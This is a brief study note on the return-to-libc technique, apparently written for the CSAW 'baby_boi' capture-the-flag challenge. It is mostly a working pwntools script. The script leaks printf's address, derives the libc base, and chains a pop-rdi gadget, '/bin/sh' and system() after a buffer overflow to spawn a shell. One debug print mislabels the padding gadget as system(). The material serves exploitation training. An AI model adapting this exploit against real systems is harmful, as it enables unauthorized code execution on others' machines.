[[Return-to-libc attack](Low%20Level%20Theories/Return-to-libc%20attack.md)]]

We can calculate the runtime address of anything else in libc by taking the pointer we’re given, subtracting `0x64e80`, and adding the fixed offset calculated from our copy of libc.
```python
#!/usr/bin/env python2
from pwn import *

p = process("./baby_boi")
libc = ELF('libc-2.27.so')
context.terminal = ['tmux', 'new-window']

def debug(bps):
    gdbscript = ''

    for bp in bps:
        gdbscript += 'b *0x{:x}'.format(bp)

    gdb.attach(p, gdbscript=gdbscript)


if args.GDB:
    debug([0x40072e]) # ret in main

p.recvuntil("Here I am: ")
leak = p.recv().strip()
print "leaked printf address =>", leak

printf = int(leak, 16)

# constructing payloads
# update libc base address based on the leak address
libc.address = printf - libc.symbols['printf'] 

buffer = "A"*40
pop_rdi = 0x0000000000400793 # you dont to need to pad with libc because it's not using libc
system = libc.symbols['system'] 
bin_sh = libc.search("/bin/sh").next()
padding = 0x000000000040054e

payload = [
        pop_rdi, bin_sh,
        padding, system # the whole system() has to be 16 bytes
        ]

print "pop rdi =>", hex(payload[0])
print "/bin/sh =>", hex(payload[1])
print "system() =>", hex(payload[2])

payload = "".join([p64(addr) for addr in payload])
exploit = buffer + payload

print "Sending exploit..."

p.sendline(exploit)
p.interactive()
```

## References
1. https://stackoverflow.com/questions/60729616/segfault-in-ret2libc-attack-but-not-hardcoded-system-call
2. https://faraz.faith/2019-09-16-csaw-quals-baby-boi/